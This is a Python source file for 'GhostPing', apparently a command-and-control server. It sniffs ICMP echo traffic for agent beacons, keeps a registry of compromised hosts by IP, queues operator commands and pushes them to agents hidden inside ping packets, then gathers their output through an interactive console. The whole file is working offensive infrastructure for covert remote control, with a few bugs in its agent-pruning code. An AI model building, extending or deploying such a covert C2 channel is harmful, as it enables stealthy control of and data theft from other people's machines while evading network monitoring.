from scapy.all import *
import time
import os
import threading

# ======== Initializing data sets =========

COMMANDS = {} #agent_id -> list of commands
ACTIVE_AGENTS = set() #set of active agent ids
AGENT_INFO = {} #agent_id -> {"ip","last_seen"}
RESULTS = {} #agent_id -> list of results
INACTIVITY_TIMEOUT = 120 # number of seconds before agents become stale (remove from active agents set)

lock = threading.Lock()

# ======== Helper functions ========

def get_next_agent_id():
    # Returns the next available agent ID as a 3-digit string.
    if not AGENT_INFO:
        return "001"
    # IDs already in use
    used_ids = sorted(int(agent_id) for agent_id in AGENT_INFO.keys())
    next_id = 1
    for uid in used_ids:
        if uid == next_id:
            next_id += 1
        else:
            break
    if next_id > 999:
        raise Exception("Maximum number of agents reached")
    return f"{next_id:03d}"  # format as 3-digit string

def find_agent_by_identifier(identifier):
    """
    Resolve an identifier which may be:
      - exact agent_id
      - IPv4 address string that matches a known agent
    Returns the agent_id if found, otherwise None.
    """
    with lock:
        # direct match to agent id
        if identifier in ACTIVE_AGENTS:
            return identifier
        # match by IP
        for aid, info in AGENT_INFO.items():
            if not info:
                continue
            ip = info.get('ip')
            if identifier == ip:
                return aid
    return None

# ======== Main functionality =========

def handle_packet(pkt):
    try:
        if ICMP in pkt and pkt[ICMP].type == 8 and Raw in pkt:
            payload = pkt[Raw].load.decode(errors="ignore")
            if "|" not in payload:
                return

            msg_type, result = payload.split("|", 1)

            # Only accept packets with custom payloads
            if msg_type != "BEACON" and msg_type != "RESULT":
                return  # ignore noise or non-client pings

            src = pkt[IP].src

            # print(f"\n[+] Valid client packet from {src}: {payload}")

            # Check if this IP is already registered
            agent_id = None
            for aid, info in AGENT_INFO.items():
                if info["ip"] == src:
                    agent_id = aid
                    break
            
            # If this is a new agent, assign next available ID
            if not agent_id:
                agent_id = get_next_agent_id()
                AGENT_INFO[agent_id] = {"ip": src, "last_seen": time.time()}
                ACTIVE_AGENTS.add(agent_id)
                # print(f"\n[+] New agent connected: {agent_id} ({src})")
            else:
                # Update last_seen timestamp
                AGENT_INFO[agent_id]["last_seen"] = time.time()

            # If there is a command queued, send it. Else, do nothing.
            if msg_type == "BEACON":
                queue = COMMANDS.get(agent_id)
                if not queue:
                    return

                task = queue.pop(0)   # get ONE command (FIFO)
                # Build reply packet as an echo request so it is routed properly.
                send(IP(dst=src)/ICMP(type=8)/task.encode(), verbose=0)
                # print(f"[+] Sent task to {agent_id} ({src}): {task}")

                if not queue:
                    COMMANDS.pop(agent_id, None)

            elif msg_type == "RESULT":
                # Store results as 2-tuples with a timestamp
                RESULTS.setdefault(agent_id, []).append((time.time(), result))

    except Exception as e:
        print(f"!Handler exception: {e}")

def operator_console():

    print("[*] Operator console ready. Type 'help' for commands.")
    while True:
        try:
            cmd_line = input("GhostPing> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Exiting.")
            os._exit(0)

        if not cmd_line:
            continue

        parts = cmd_line.split(" ", 2)
        cmd = parts[0].lower()

        if cmd == "help":
            print("Commands:")
            print("  list                         - List active agents (shows id, ip, age)")
            print("  info <id|ip>                 - Show detailed info for an agent")
            print("  task <id|ip list> <cmd>      - Queue a command for a list of agents separated by a comma (no space)")
            print("  task all <cmd>               - Queue a command for all active agents")
            print("  results <id|ip>              - Show results from an agent")
            print("  exit                         - Stop the server")
            continue

        if cmd == "list":
            with lock:
                now = time.time()
                # Lazy prune stale agents
                for agent_id in list(ACTIVE_AGENTS):
                    if now - AGENT_INFO[agent_id]["last_seen"] > INACTIVITY_TIMEOUT:
                        ACTIVE_AGENTS.remove(agent_id)
                        COMMANDS.pop(agent_id, None)
                        RESULTS.pop(agent_id, None)
                        AGENT_INFO.pop(agent_id, None)
                        print(f"[PRUNE] Removed stale agent {agent}")

                if not ACTIVE_AGENTS:
                    print("No active agents.")
                else:
                    print("[*] Active agents (" + str(len(ACTIVE_AGENTS)) + "):")
                    for agent in sorted(ACTIVE_AGENTS):
                        info = AGENT_INFO.get(agent, {})
                        ip = info.get('ip', 'unknown')
                        age = int(now - AGENT_INFO[agent_id]["last_seen"])
                        print(f" - id={agent} ip={ip} age={age}s")
            continue

        if cmd == "info":
            if len(parts) < 2:
                print("Usage: info <agent_id|ip>")
                continue
            identifier = parts[1] # This could be agent id or ip
            agent_id = find_agent_by_identifier(identifier)
            if not agent_id:
                print(f"No such agent for {identifier}.")
                continue
            with lock:
                info = AGENT_INFO.get(agent_id, {})
                print(f"  Agent ID: {agent_id}")
                print(f"  IP: {info.get('ip', 'unknown')}")
                age = int(time.time() - AGENT_INFO[agent_id]["last_seen"])
                print(f"  Last seen: {age}s ago")
                print(f"  Queued tasks: {len(COMMANDS.get(agent_id, []))}")
                print(f"  Stored result chunks: {len(RESULTS.get(agent_id, []))}")
            continue

        if cmd == "task":   # working on this
            if len(parts) < 3:
                print("Usage: task <agent_id|ip list> <command>")
                continue
            identifiers = parts[1].split(",") # list of ids or ips to queue the command for.
            for identifier in identifiers:
                command_text = parts[2]
                if identifier == "all":
                    with lock:
                        for agent_id in ACTIVE_AGENTS:
                            COMMANDS.setdefault(agent_id, []).append(command_text)
                else:
                    agent_id = find_agent_by_identifier(identifier)
                    if not agent_id:
                        print(f"No such agent (or stale) for {identifier}")
                        continue
                    with lock:
                        COMMANDS.setdefault(agent_id, []).append(command_text)
                        ip = AGENT_INFO.get(agent_id, {}).get("ip")
                        print(f"[+] Queued command for id={agent_id} ip={ip}: {command_text}")
            continue

        if cmd == "results":
            if len(parts) < 2:
                print("Usage: results <agent_id|ip>")
                continue
            identifier = parts[1]
            agent_id = find_agent_by_identifier(identifier)
            if not agent_id:
                print("No such agent.")
                continue
            with lock:
                chunks = sorted(RESULTS.get(agent_id, []))
                if not chunks:
                    print(f"No results for {identifier}")
                    continue
                full_result = "\n".join(chunk for _, chunk in chunks)
                print(f"----- Results from id={identifier} -----")
                print(full_result)
                print("-------------------------------")
                RESULTS[agent_id] = []
            continue

        if cmd in ("quit", "exit"):
            print("[*] Quitting C2 server.")
            os._exit(0)

        print("Unknown command. Type 'help'.")

def main():
    print()
    print("--------------------------------------------------")
    print(r"   ________               __  ____  _            ")
    print(r"  / ____/ /_  ____  _____/ /_/ __ \(_)___  ____ _")
    print(r" / / __/ __ \/ __ \/ ___/ __/ /_/ / / __ \/ __ `/")
    print(r"/ /_/ / / / / /_/ (__  ) /_/ ____/ / / / / /_/ / ")
    print(r"\____/_/ /_/\____/____/\__/_/   /_/_/ /_/\__, /  ")
    print(r"                                        /____/  ")
    print("--------------------------------------------------")
    print()

    # start operator console in background
    threading.Thread(target=operator_console, daemon=True).start()
    # start sniffing for ICMP beacons / results
    sniff(filter="icmp", prn=handle_packet)

if __name__ == "__main__":
    main()
